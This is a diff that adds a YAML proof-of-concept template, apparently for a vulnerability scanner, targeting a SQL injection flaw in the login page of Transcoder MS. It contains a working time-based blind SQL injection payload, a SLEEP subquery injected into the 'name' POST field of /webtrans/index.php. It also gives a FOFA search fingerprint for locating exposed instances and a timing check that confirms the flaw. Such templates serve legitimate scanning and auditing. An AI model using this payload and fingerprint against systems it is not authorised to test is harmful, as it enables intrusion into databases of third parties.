@@ -1,0 +1,20 @@
+id: poc-yaml-transcoder-ms-index-php-sqli
+info:
+  name: Transcoder MS index.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: transcoder-ms
+  fofa: body="webtrans//js/md5-min.js"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /webtrans/index.php?controller=user&action=login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=test123') AND (SELECT 3356 FROM (SELECT(SLEEP({{.t1}})))xSEI) AND ('pJPU'='pJPU&pass=OThkNzJlMThlMDUwMGZlNzk5ZTY0Y2MyYTkxNzIyYzY%3D&lang=zh_CN
+  expression: status_code == 200 && contains(title,"Transcoder MS") && contains(body,"Username
+    or password maybe wrong") && duration > t1 && duration < t2
+transport: http
